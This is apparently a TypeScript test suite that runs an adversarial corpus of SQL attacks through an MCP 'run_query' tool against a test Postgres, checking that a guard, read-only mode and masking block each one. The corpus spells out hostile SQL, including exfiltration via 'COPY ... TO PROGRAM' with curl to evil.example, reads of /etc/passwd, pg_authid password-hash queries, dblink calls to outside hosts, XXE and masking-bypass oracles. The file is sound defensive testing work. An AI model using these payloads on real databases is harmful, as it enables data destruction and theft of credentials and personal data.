/**
 * Adversarial corpus, run end-to-end through the MCP `run_query` tool against a real
 * (in-process) Postgres. An attack counts as blocked when one of the layers stops it:
 *
 *   guard    - rejected by the parser-based SQL guard before reaching the database
 *   postgres - reached Postgres and failed (read-only transaction, column hidden by policy, ...)
 *   masked   - ran, but returned only masked / capped data
 *
 * Afterwards the database must be byte-for-byte unchanged and no raw secret may appear in any output.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { SECRET_PATTERNS, startServer } from './helpers.js';

type Layer = 'guard' | 'postgres' | 'masked';
interface Attack {
  name: string;
  sql: string;
  /** For "masked" cases: an oracle query must not match anything. */
  expectNoRows?: boolean;
  /** Overrides the category's expected layer. */
  layer?: Layer;
}

const attacks: Record<string, Attack[]> = {
  'stacked queries': [
    { name: 'select then drop', sql: 'SELECT 1; DROP TABLE customers' },
    { name: 'select then delete, no space', sql: 'SELECT 1;DELETE FROM orders' },
    { name: 'two selects', sql: 'SELECT * FROM orders; SELECT * FROM customers' },
    { name: 'empty statement in between', sql: 'SELECT 1;;DELETE FROM orders' },
    { name: 'stacked after line comment', sql: 'SELECT 1; -- harmless\nDROP TABLE orders' },
    { name: 'stacked after block comment', sql: 'SELECT 1 /* x */ ; UPDATE products SET price_cents = 1' },
    { name: 'commit then write', sql: 'COMMIT; DELETE FROM orders' },
    { name: 'end transaction then write', sql: 'END; DROP TABLE orders' },
    { name: 'rollback then disable read-only', sql: 'ROLLBACK; SET default_transaction_read_only = off' },
    { name: 'select then commit', sql: 'SELECT 1; COMMIT' },
    { name: 'trailing write after valid select', sql: "SELECT * FROM orders WHERE status = 'paid'; TRUNCATE orders" },
  ],
  'DML / DDL / utility statements': [
    { name: 'INSERT', sql: "INSERT INTO products (sku, name, category, price_cents) VALUES ('x', 'x', 'x', 1)" },
    { name: 'UPDATE', sql: 'UPDATE products SET price_cents = 1' },
    { name: 'DELETE', sql: 'DELETE FROM orders' },
    { name: 'MERGE', sql: 'MERGE INTO products p USING products q ON p.id = q.id WHEN MATCHED THEN DELETE' },
    { name: 'TRUNCATE', sql: 'TRUNCATE order_items' },
    { name: 'DROP TABLE', sql: 'DROP TABLE customers' },
    { name: 'ALTER TABLE', sql: 'ALTER TABLE customers ADD COLUMN pwned int' },
    { name: 'CREATE TABLE', sql: 'CREATE TABLE pwned (id int)' },
    { name: 'CREATE TABLE AS', sql: 'CREATE TABLE stolen AS SELECT * FROM customers' },
    { name: 'CREATE VIEW', sql: 'CREATE VIEW v AS SELECT * FROM admin_users' },
    { name: 'CREATE FUNCTION', sql: "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'" },
    { name: 'CREATE EXTENSION', sql: 'CREATE EXTENSION dblink' },
    { name: 'DO block', sql: "DO $$ BEGIN DELETE FROM orders; END $$" },
    { name: 'CALL', sql: 'CALL some_proc()' },
    { name: 'GRANT', sql: 'GRANT ALL ON customers TO PUBLIC' },
    { name: 'REVOKE', sql: 'REVOKE SELECT ON customers FROM PUBLIC' },
    { name: 'CREATE ROLE', sql: "CREATE ROLE evil LOGIN SUPERUSER PASSWORD 'x'" },
    { name: 'ALTER ROLE', sql: 'ALTER ROLE CURRENT_USER SUPERUSER' },
    { name: 'ALTER SYSTEM', sql: "ALTER SYSTEM SET log_statement = 'none'" },
    { name: 'COPY TO PROGRAM', sql: "COPY customers TO PROGRAM 'curl -d @- evil.example'" },
    { name: 'COPY FROM file', sql: "COPY products FROM '/etc/passwd'" },
    { name: 'COPY (SELECT) TO STDOUT', sql: 'COPY (SELECT * FROM admin_users) TO STDOUT' },
    { name: 'VACUUM', sql: 'VACUUM FULL customers' },
    { name: 'ANALYZE', sql: 'ANALYZE customers' },
    { name: 'REINDEX', sql: 'REINDEX TABLE customers' },
    { name: 'CLUSTER', sql: 'CLUSTER customers' },
    { name: 'LOCK TABLE', sql: 'LOCK TABLE orders IN ACCESS EXCLUSIVE MODE' },
    { name: 'REFRESH MATERIALIZED VIEW', sql: 'REFRESH MATERIALIZED VIEW mv' },
    { name: 'COMMENT ON', sql: "COMMENT ON TABLE customers IS 'pwned'" },
    { name: 'SET', sql: 'SET statement_timeout = 0' },
    { name: 'SET ROLE', sql: 'SET ROLE postgres' },
    { name: 'SET SESSION AUTHORIZATION', sql: 'SET SESSION AUTHORIZATION postgres' },
    { name: 'SET TRANSACTION READ WRITE', sql: 'SET TRANSACTION READ WRITE' },
    { name: 'RESET ALL', sql: 'RESET ALL' },
    { name: 'BEGIN', sql: 'BEGIN' },
    { name: 'START TRANSACTION READ WRITE', sql: 'START TRANSACTION READ WRITE' },
    { name: 'PREPARE', sql: 'PREPARE p AS DELETE FROM orders' },
    { name: 'EXECUTE', sql: 'EXECUTE p' },
    { name: 'DECLARE CURSOR', sql: 'DECLARE c CURSOR FOR SELECT * FROM admin_users' },
    { name: 'LISTEN', sql: 'LISTEN ch' },
    { name: 'NOTIFY', sql: "NOTIFY ch, 'x'" },
    { name: 'LOAD', sql: "LOAD '/tmp/evil.so'" },
    { name: 'DISCARD ALL', sql: 'DISCARD ALL' },
    { name: 'CHECKPOINT', sql: 'CHECKPOINT' },
    { name: 'SHOW ALL', sql: 'SHOW ALL' },
    { name: 'EXPLAIN ANALYZE DELETE', sql: 'EXPLAIN ANALYZE DELETE FROM orders' },
    { name: 'EXPLAIN ANALYZE SELECT (executes)', sql: 'EXPLAIN ANALYZE SELECT * FROM orders' },
  ],
  'comment and case obfuscation': [
    { name: 'leading block comment', sql: '/* SELECT */ DELETE FROM orders' },
    { name: 'leading line comment', sql: '-- SELECT\nDELETE FROM orders' },
    { name: 'mixed case', sql: 'SeLeCt 1; dElEtE FrOm orders' },
    { name: 'comment as whitespace', sql: 'DELETE/**/FROM/**/orders' },
    { name: 'nested block comments', sql: '/* /* nested */ SELECT */ DROP TABLE orders' },
    { name: 'newline/tab separators', sql: 'SELECT\t1;\n\nDROP\tTABLE\norders' },
  ],
  'writes hidden inside a SELECT': [
    { name: 'DELETE in CTE', sql: 'WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d' },
    { name: 'UPDATE in CTE', sql: 'WITH u AS (UPDATE products SET price_cents = 1 RETURNING id) SELECT count(*) FROM u' },
    { name: 'INSERT in CTE', sql: "WITH i AS (INSERT INTO products (sku, name, category, price_cents) VALUES ('x','x','x',1) RETURNING id) SELECT * FROM i" },
    { name: 'MERGE in CTE', sql: 'WITH m AS (MERGE INTO products p USING products q ON p.id = q.id WHEN MATCHED THEN DELETE RETURNING p.id) SELECT * FROM m' },
    { name: 'DELETE in nested CTE', sql: 'SELECT * FROM (WITH d AS (DELETE FROM orders RETURNING id) SELECT * FROM d) s' },
    { name: 'second of several CTEs writes', sql: 'WITH a AS (SELECT 1), b AS (DELETE FROM order_items RETURNING 1) SELECT * FROM a' },
    { name: 'CTE prefix on DELETE', sql: 'WITH x AS (SELECT 1) DELETE FROM orders' },
    { name: 'SELECT INTO', sql: 'SELECT * INTO stolen FROM customers' },
    { name: 'SELECT INTO TEMP', sql: 'SELECT * INTO TEMP t FROM orders' },
    { name: 'SELECT INTO UNLOGGED', sql: 'SELECT 1 INTO UNLOGGED t' },
    { name: 'SELECT INTO after CTE', sql: 'WITH x AS (SELECT 1) SELECT * INTO t FROM x' },
    { name: 'FOR UPDATE', sql: 'SELECT * FROM orders FOR UPDATE' },
    { name: 'FOR SHARE', sql: 'SELECT * FROM orders FOR SHARE' },
    { name: 'FOR NO KEY UPDATE', sql: 'SELECT * FROM orders FOR NO KEY UPDATE' },
    { name: 'FOR KEY SHARE', sql: 'SELECT * FROM orders FOR KEY SHARE' },
    { name: 'FOR UPDATE SKIP LOCKED', sql: 'SELECT * FROM orders FOR UPDATE SKIP LOCKED' },
    { name: 'FOR UPDATE in subquery', sql: 'SELECT * FROM (SELECT * FROM orders FOR UPDATE) s' },
  ],
  'dangerous functions': [
    { name: 'pg_sleep', sql: 'SELECT pg_sleep(30)' },
    { name: 'pg_sleep_for', sql: "SELECT pg_sleep_for('1 hour')" },
    { name: 'pg_sleep_until', sql: "SELECT pg_sleep_until('2100-01-01')" },
    { name: 'schema-qualified', sql: 'SELECT pg_catalog.pg_sleep(30)' },
    { name: 'upper case', sql: 'SELECT PG_SLEEP(30)' },
    { name: 'quoted identifier', sql: 'SELECT "pg_sleep"(30)' },
    { name: 'unicode-escaped identifier', sql: 'SELECT U&"\\0070g_sleep"(30)' },
    { name: 'in WHERE', sql: 'SELECT * FROM orders WHERE pg_sleep(1) IS NOT NULL' },
    { name: 'in ORDER BY', sql: 'SELECT * FROM orders ORDER BY pg_sleep(0.1)' },
    { name: 'in FROM', sql: 'SELECT * FROM pg_sleep(30)' },
    { name: 'in ROWS FROM', sql: 'SELECT * FROM ROWS FROM (pg_sleep(30))' },
    { name: 'in LATERAL subquery', sql: 'SELECT o.id FROM orders o, LATERAL (SELECT pg_sleep(1)) s' },
    { name: 'in CTE', sql: 'WITH s AS (SELECT pg_sleep(30)) SELECT * FROM s' },
    { name: 'in CASE', sql: 'SELECT CASE WHEN true THEN pg_sleep(30) END' },
    { name: 'in VALUES', sql: 'VALUES ((SELECT pg_sleep(30)))' },
    { name: 'in aggregate FILTER', sql: 'SELECT count(*) FILTER (WHERE pg_sleep(1) IS NULL) FROM orders' },
    { name: 'in function default arg', sql: 'SELECT coalesce(NULL, pg_sleep(30)::text)' },
    { name: 'dblink', sql: "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)" },
    { name: 'dblink_exec', sql: "SELECT dblink_exec('dbname=app', 'DELETE FROM orders')" },
    { name: 'dblink_connect', sql: "SELECT dblink_connect('host=evil.example')" },
    { name: 'lo_import', sql: "SELECT lo_import('/etc/passwd')" },
    { name: 'lo_export', sql: "SELECT lo_export(1, '/tmp/x')" },
    { name: 'lo_from_bytea', sql: "SELECT lo_from_bytea(0, 'x')" },
    { name: 'lo_get', sql: 'SELECT lo_get(1)' },
    { name: 'pg_read_file', sql: "SELECT pg_read_file('/etc/passwd')" },
    { name: 'pg_read_binary_file', sql: "SELECT pg_read_binary_file('postgresql.conf')" },
    { name: 'pg_ls_dir', sql: "SELECT pg_ls_dir('.')" },
    { name: 'pg_ls_waldir', sql: 'SELECT * FROM pg_ls_waldir()' },
    { name: 'pg_stat_file', sql: "SELECT pg_stat_file('postgresql.conf')" },
    { name: 'set_config read-only off', sql: "SELECT set_config('default_transaction_read_only', 'off', false)" },
    { name: 'set_config timeout off', sql: "SELECT set_config('statement_timeout', '0', true)" },
    { name: 'set_config search_path', sql: "SELECT set_config('search_path', 'evil', true)" },
    { name: 'pg_terminate_backend', sql: 'SELECT pg_terminate_backend(pid) FROM pg_stat_activity' },
    { name: 'pg_cancel_backend', sql: 'SELECT pg_cancel_backend(1)' },
    { name: 'pg_reload_conf', sql: 'SELECT pg_reload_conf()' },
    { name: 'pg_rotate_logfile', sql: 'SELECT pg_rotate_logfile()' },
    { name: 'pg_switch_wal', sql: 'SELECT pg_switch_wal()' },
    { name: 'pg_promote', sql: 'SELECT pg_promote()' },
    { name: 'pg_backup_start', sql: "SELECT pg_backup_start('x')" },
    { name: 'pg_create_logical_replication_slot', sql: "SELECT pg_create_logical_replication_slot('s', 'test_decoding')" },
    { name: 'pg_drop_replication_slot', sql: "SELECT pg_drop_replication_slot('s')" },
    { name: 'pg_logical_emit_message', sql: "SELECT pg_logical_emit_message(true, 'x', 'y')" },
    { name: 'query_to_xml executes a SQL string', sql: "SELECT query_to_xml('DELETE FROM orders RETURNING *', true, true, '')" },
    { name: 'query_to_xml hidden table', sql: "SELECT query_to_xml('SELECT * FROM admin_users', true, true, '')" },
    { name: 'table_to_xml', sql: "SELECT table_to_xml('admin_users', true, true, '')" },
    { name: 'cursor_to_xml', sql: "SELECT cursor_to_xml('c', 10, true, true, '')" },
    { name: 'database_to_xml', sql: "SELECT database_to_xml(true, true, '')" },
    { name: 'ts_stat executes a SQL string', sql: "SELECT * FROM ts_stat('SELECT to_tsvector(api_token) FROM admin_users')" },
    { name: 'pg_advisory_lock', sql: 'SELECT pg_advisory_lock(1)' },
    { name: 'pg_try_advisory_lock', sql: 'SELECT pg_try_advisory_lock(1)' },
    { name: 'pg_notify', sql: "SELECT pg_notify('ch', 'x')" },
    { name: 'nextval', sql: "SELECT nextval('orders_id_seq')" },
    { name: 'setval', sql: "SELECT setval('orders_id_seq', 1)" },
    { name: 'txid_current', sql: 'SELECT txid_current()' },
  ],
  'table allowlist and catalog exfiltration': [
    { name: 'hidden table', sql: 'SELECT * FROM admin_users' },
    { name: 'hidden table, qualified', sql: 'SELECT * FROM public.admin_users' },
    { name: 'hidden table, quoted', sql: 'SELECT * FROM "admin_users"' },
    { name: 'hidden table, upper case', sql: 'SELECT * FROM PUBLIC.ADMIN_USERS' },
    { name: 'TABLE shorthand', sql: 'TABLE admin_users' },
    { name: 'hidden table in subquery', sql: 'SELECT * FROM orders WHERE customer_id IN (SELECT id FROM admin_users)' },
    { name: 'hidden table in EXISTS', sql: "SELECT 1 WHERE EXISTS (SELECT 1 FROM admin_users WHERE api_token LIKE 'tok_a%')" },
    { name: 'hidden table in join', sql: 'SELECT * FROM orders o JOIN admin_users a ON a.id = o.id' },
    { name: 'hidden table in CTE', sql: 'WITH x AS (SELECT * FROM admin_users) SELECT * FROM x' },
    { name: 'hidden table in scalar subquery', sql: 'SELECT (SELECT api_token FROM admin_users LIMIT 1)' },
    { name: 'hidden table via UNION', sql: 'SELECT username, api_token FROM admin_users UNION SELECT full_name, city FROM customers' },
    { name: 'hidden table in LATERAL', sql: 'SELECT * FROM orders o, LATERAL (SELECT api_token FROM admin_users) a' },
    { name: 'CTE name shadowing, out of scope', sql: 'SELECT * FROM (WITH admin_users AS (SELECT 1) SELECT * FROM admin_users) a, admin_users' },
    { name: 'schema-qualified name matching a CTE', sql: 'WITH admin_users AS (SELECT 1) SELECT * FROM public.admin_users' },
    { name: 'CTE forward reference resolves to real table', sql: 'WITH a AS (SELECT * FROM admin_users), admin_users AS (SELECT 1 AS x) SELECT * FROM a' },
    { name: 'cross-database reference', sql: 'SELECT * FROM otherdb.public.customers' },
    { name: 'pg_shadow', sql: 'SELECT * FROM pg_shadow' },
    { name: 'pg_authid', sql: 'SELECT rolpassword FROM pg_authid' },
    { name: 'pg_user', sql: 'SELECT * FROM pg_user' },
    { name: 'pg_roles', sql: 'SELECT * FROM pg_catalog.pg_roles' },
    { name: 'pg_settings', sql: 'SELECT * FROM pg_settings' },
    { name: 'pg_stat_activity (other sessions\' SQL)', sql: 'SELECT query FROM pg_stat_activity' },
    { name: 'pg_proc', sql: 'SELECT prosrc FROM pg_proc' },
    { name: 'pg_class', sql: 'SELECT relname FROM pg_class' },
    { name: 'information_schema.tables', sql: 'SELECT * FROM information_schema.tables' },
    { name: 'information_schema.columns', sql: "SELECT column_name FROM information_schema.columns WHERE table_name = 'admin_users'" },
  ],
  'hidden columns': [
    { name: 'hidden column', sql: 'SELECT password_hash FROM customers' },
    { name: 'hidden column, alias-qualified', sql: 'SELECT c.password_hash FROM customers c' },
    { name: 'hidden column in WHERE (oracle)', sql: "SELECT id FROM customers WHERE password_hash LIKE '$2b%'" },
    { name: 'hidden column via schema-qualified ref', sql: 'SELECT public.customers.password_hash FROM public.customers' },
    { name: 'system column ctid', sql: 'SELECT ctid, xmin FROM customers' },
  ],
  'masking bypass attempts': [
    { name: 'direct', sql: 'SELECT email, phone FROM customers' },
    { name: 'star', sql: 'SELECT * FROM customers' },
    { name: 'alias', sql: 'SELECT c.email AS e FROM customers c' },
    { name: 'table-qualified', sql: 'SELECT customers.email FROM customers' },
    { name: 'whole-row reference', sql: 'SELECT c FROM customers c' },
    { name: 'row_to_json', sql: 'SELECT row_to_json(c) FROM customers c' },
    { name: 'to_jsonb on table name', sql: 'SELECT to_jsonb(customers) FROM customers' },
    { name: 'wrapped in function', sql: 'SELECT upper(email), lower(phone) FROM customers' },
    { name: 'cast to bytea', sql: 'SELECT email::bytea FROM customers' },
    { name: 'substring', sql: 'SELECT substr(email, 1, 40) FROM customers' },
    { name: 'string_agg', sql: "SELECT string_agg(email, ',') FROM customers" },
    { name: 'array_agg', sql: 'SELECT array_agg(phone) FROM customers' },
    { name: 'subquery', sql: 'SELECT * FROM (SELECT * FROM customers) s' },
    { name: 'scalar subquery', sql: 'SELECT (SELECT email FROM customers ORDER BY id LIMIT 1)' },
    { name: 'CTE rename', sql: 'WITH x AS (SELECT email AS e FROM customers) SELECT e FROM x' },
    { name: 'ONLY', sql: 'SELECT email FROM ONLY customers' },
    { name: 'column alias list', sql: 'SELECT x.a, x.b, x.c, x.d FROM customers AS x(a, b, c, d)' },
    { name: 'self-join USING masked column', sql: 'SELECT * FROM customers JOIN customers c2 USING (email) LIMIT 5' },
    { name: 'UNION into visible column', sql: 'SELECT city FROM customers UNION ALL SELECT email FROM customers' },
    { name: 'equality oracle', sql: "SELECT id FROM customers WHERE email = 'customer1@example.com'", expectNoRows: true },
    { name: 'LIKE oracle', sql: "SELECT id FROM customers WHERE email LIKE 'customer1%'", expectNoRows: true },
    { name: 'position oracle', sql: "SELECT id FROM customers WHERE position('customer' IN email) > 0", expectNoRows: true },
    { name: 'phone prefix oracle', sql: "SELECT id FROM customers WHERE phone LIKE '+1-555%'", expectNoRows: true },
  ],
  'row-limit / resource abuse': [
    { name: 'huge generate_series', sql: 'SELECT * FROM generate_series(1, 1000000)' },
    { name: 'LIMIT ALL', sql: 'SELECT * FROM order_items LIMIT ALL' },
    { name: 'LIMIT larger than cap', sql: 'SELECT * FROM order_items LIMIT 100000' },
    { name: 'LIMIT expression', sql: 'SELECT * FROM order_items LIMIT (SELECT 100000)' },
    { name: 'FETCH FIRST WITH TIES', sql: 'SELECT * FROM order_items ORDER BY quantity FETCH FIRST 1 ROWS WITH TIES', layer: 'guard' },
    { name: 'LIMIT expression in subquery wrapper', sql: 'SELECT * FROM (SELECT * FROM order_items) s LIMIT (SELECT 5000)' },
    { name: 'cross join explosion', sql: 'SELECT * FROM orders a CROSS JOIN orders b' },
    { name: 'UNION ALL', sql: 'SELECT * FROM order_items UNION ALL SELECT * FROM order_items' },
    { name: 'oversized query text', sql: `SELECT 1 ${'+ 1 '.repeat(6000)}`, layer: 'guard' },
  ],
  'parser edge cases': [
    { name: 'empty string', sql: '' },
    { name: 'only a comment', sql: '-- nothing here' },
    { name: 'syntax error', sql: 'SELEC * FRM orders' },
    { name: 'bind parameter', sql: 'SELECT * FROM orders WHERE id = $1' },
    { name: 'XMLTABLE', sql: "SELECT * FROM XMLTABLE('/x' PASSING '<x/>' COLUMNS a int)" },
    { name: 'xmlparse (XXE surface)', sql: "SELECT xmlparse(document '<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>')" },
    { name: 'EXPLAIN wrapper', sql: 'EXPLAIN SELECT * FROM admin_users' },
  ],
};

/** Which layer must stop each category. Everything else must be stopped by the guard itself. */
const EXPECTED_LAYER: Record<string, Layer> = {
  'hidden columns': 'postgres',
  'masking bypass attempts': 'masked',
  'row-limit / resource abuse': 'masked',
};

const total = Object.values(attacks).flat().length;
const tally: Record<Layer, number> = { guard: 0, postgres: 0, masked: 0 };
let ctx: Awaited<ReturnType<typeof startServer>>;
let snapshotBefore: string;

const snapshot = async () => {
  const tables = ['customers', 'products', 'orders', 'order_items', 'admin_users'];
  const parts = await Promise.all(tables.map((t) => ctx.db.query(`SELECT md5(string_agg(x::text, '' ORDER BY x::text)) FROM ${t} x`)));
  return parts.map((p) => p.rows[0].md5).join(':');
};

beforeAll(async () => {
  ctx = await startServer();
  snapshotBefore = await snapshot();
});

afterAll(async () => {
  console.log(
    `\nAttack corpus: ${total} cases, blocked ${tally.guard + tally.postgres + tally.masked}/${total} ` +
      `(guard: ${tally.guard}, postgres: ${tally.postgres}, masked/capped: ${tally.masked})`,
  );
  await ctx.close();
});

for (const [category, cases] of Object.entries(attacks)) {
  describe(category, () => {
    it.each(cases)('$name', async ({ sql, expectNoRows, layer: expected }) => {
      const res = await ctx.call('run_query', { sql });

      for (const re of SECRET_PATTERNS) expect(res.text).not.toMatch(re);

      const layer: Layer = !res.isError ? 'masked' : res.text.startsWith('Rejected by guard') ? 'guard' : 'postgres';
      tally[layer]++;
      if (layer === 'masked') {
        expect(res.data.rowCount).toBeLessThanOrEqual(ctx.policy.maxRows);
        if (expectNoRows) expect(res.data.rowCount).toBe(0);
      }
      expect(layer, res.text).toBe(expected ?? EXPECTED_LAYER[category] ?? 'guard');
    });
  });
}

describe('after the whole corpus', () => {
  it('database content is unchanged', async () => {
    expect(await snapshot()).toBe(snapshotBefore);
  });

  it('every attempt is in the audit log', () => {
    expect(ctx.audit.filter((e) => e.tool === 'run_query')).toHaveLength(total);
  });
});
